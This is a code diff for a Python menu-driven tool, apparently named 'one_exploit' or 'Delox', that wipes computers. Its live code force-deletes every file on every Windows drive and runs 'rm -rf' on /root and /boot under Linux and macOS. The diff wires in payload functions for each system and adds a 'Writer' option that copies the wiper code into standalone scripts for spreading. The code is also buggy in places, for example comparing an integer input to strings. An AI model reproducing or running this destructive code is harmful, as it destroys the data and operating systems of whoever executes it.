@@ -1,3 +1,5 @@
+import random
+from turtle import color
 from requests import get
 import socket
 from lib2to3.pgen2 import driver
@@ -41,9 +43,10 @@ def run():
         [04] -> Writer
         [99] -> exit
         ''')
-        print(systems)
-
+        return systems
+print(run())
 sys = int(input('one_exploit => '))
+
 if sys == '01' or sys == '02' or sys == '03':
     print('Which one [1,2,3,99]')
     run()
@@ -80,15 +83,6 @@ if sys == 1:
                     for d in listdrive:
                         driver = d
                         os.system('del '+ driver + ':\*.* /f /s /q')
-                    # os.system('off')
-                    # os.system('attrib -r -g -h C:\\autoexec.bat')
-                    # os.system('del C:\\autoexec.bat')
-                    # os.system('attrib -r -g -h C:\\boot.ini')
-                    # os.system('del C:\\boot.ini')
-                    # os.system('attrib -r -g -h C:\\ntidr')
-                    # os.system('del C:\\ntidr')
-                    # os.system('attrib -r -g -h C:\windows\win.ini')
-                    # os.system('del C:\windows\win.ini')
                 else:
                     print(f'usename: {username()}')
                     print('password: ')
@@ -97,18 +91,10 @@ if sys == 1:
                     for d in listdrive:
                         driver = d
                         os.system('del '+ driver + ':\*.* /f /s /q')
-                    # os.system('off')
-                    # os.system('attrib -r -g -h C:\autoexec.bat')
-                    # os.system('del C:\autoexec.bat')
-                    # os.system('attrib -r -g -h C:\boot.ini')
-                    # os.system('del C:\boot.ini')
-                    # os.system('attrib -r -g -h C:\ntidr')
-                    # os.system('del C:\ntidr')
-                    # os.system('attrib -r -g -h C:\windows\win.ini')
-                    # os.system('del C:\windows\win.ini')
                     print('=============================')
                     print('    YOU DELET ALL SYSTEM    |')
                     print('=============================')
+            delWindows()
             break
         except AttributeError:
             print( Color.RED +'[*] -> plese check the systems.')
@@ -155,6 +141,7 @@ elif sys == 2:
                     os.system('sudo cp -r /root/*') or os.system('cp -r /root/*')
                     os.system('sudo rm -rf /root/*') or os.system('rm -rf /root/*')
                     os.system('sudo rm -rf /boot/*') or os.system('rm -rf /boot/*')
+            delLinux()
             break
         except AttributeError:
             print( Color.RED +'[*] -> plese check the systems.')
@@ -171,14 +158,15 @@ elif sys == 3:
                 os.system('sudo cp -r /root/*') or os.system('cp -r /root/*')
                 os.system('sudo rm -rf /root/*') or os.system('rm -rf /root/*')
                 os.system('sudo rm -rf /boot/*') or os.system('rm -rf /boot/*')
+            delOs()
             break
         except AttributeError:
             print( Color.RED +'[*] -> plese check the systems.')
 
 
 elif sys == 4:
-    while True:
-        try:
+    def Menu_Writer():
+        while True:
             ClearCSR()
             print(banner.Created_banner('Write Delox'))
             print('which one?')
@@ -189,40 +177,106 @@ elif sys == 4:
             [help] -> help
                 ''')
             numbers = input('Enter Number: ')
-            def Windows():
-                with open('Windows.py', 'w') as file:
-                    file.write(delWindows())
-                    file.close()
-            def Linux():
-                with open('Windows.py', 'w') as file:
-                    file.write(delWindows())
-                    file.close()
-            def MacOS():
-                with open('MacOS.py', 'w') as file:
-                    file.write(delOs())
-                    file.close()
-            def Help():
-                with open('help.py', 'w') as file:
-                    file.write('In this section, you can separate each executable file and save it in another file, for example, if you read Linux, it will copy the code in this tool for Linux in a new file and add it to the new file.')
-                    file.close()
 
+            def Windows():
+                with open('init/main1.py', 'r') as mfile:
+                    with open('Windows.py', 'w') as file:
+                        file.writelines(mfile)
+                        file.close()
+            def Linux():
+                with open('init/main2.py', 'r') as mfile:
+                    with open('Windows.py', 'w') as file:
+                        file.writelines(mfile)
+                        file.close()
+            def MacOS():
+                with open('init/main3.py' , 'r') as osfile:
+                    with open('MacOS.py', 'w') as macOS:
+                        macOS.writelines(osfile)
+                        macOS.close()
+            def Help():
+
+                Helping = 'In this section, you can separate each executable\
+                    file and save it in another file, for example, if you read Linux,\
+                    it will copy the code in this tool for Linux in a new file and add it to the new file.\n \t \t \
+                        if Do you went backed in first page write (Back) else Enter'
+                print(Helping)
+                with open('help.py', 'w') as file:
+                    file.write(Helping)
+                    file.close()
             if numbers == '1':
+                print(Color.RED + '[*] waiting .')
+                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
+                print(Color.RED + '[*] waiting ..')
+                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
+                print(Color.RED + '[*] waiting ...')
+                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
+                print(Color.RED + '[*] waiting ....')
+                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
+                print(Color.RED + '[*] waiting .....')
+                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
+                print(Color.RED + '[*] waiting ......')
+                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
+                print('\t\t The END')
+                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
                 Windows()
             elif numbers == '2':
+                print(Color.RED + '[*] waiting .')
+                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
+                print(Color.RED + '[*] waiting ..')
+                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
+                print(Color.RED + '[*] waiting ...')
+                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
+                print(Color.RED + '[*] waiting ....')
+                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
+                print(Color.RED + '[*] waiting .....')
+                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
+                print(Color.RED + '[*] waiting ......')
+                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
+                print('\t\t The END')
+                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
                 Linux()
             elif numbers == '3':
+                print(Color.RED + '[*] waiting .')
+                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
+                print(Color.RED + '[*] waiting ..')
+                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
+                print(Color.RED + '[*] waiting ...')
+                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
+                print(Color.RED + '[*] waiting ....')
+                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
+                print(Color.RED + '[*] waiting .....')
+                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
+                print(Color.RED + '[*] waiting ......')
+                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
+                print('\t\t The END')
+                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
                 MacOS()
             elif numbers == 'help' or numbers == 'Help' or numbers == '4':
-                Help()
-        except AttributeError:
-            print('Attribute Error')
+                print(Color.RED + '[*] waiting .')
+                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
+                print(Color.RED + '[*] waiting ..')
+                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
+                print(Color.RED + '[*] waiting ...')
+                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
+                print(Color.RED + '[*] waiting ....')
+                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
+                print(Color.RED + '[*] waiting .....')
+                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
+                print(Color.RED + '[*] waiting ......')
+                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
+                print('\t\t The END')
+                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
 
+                input1 = input('Enter Anything.....')
+                if input1 == '' or input1 == 'Enter' or input1 == 'enter':
+                    Menu_Writer()
+                elif input1 == 'back' or input1 == 'Back':
+                    run()
+            Help()
+    Menu_Writer()
 elif sys == 99:
     print('Good By')
     exits()
-
-
-else:
+elif sys == '':
     run()
 
-run()
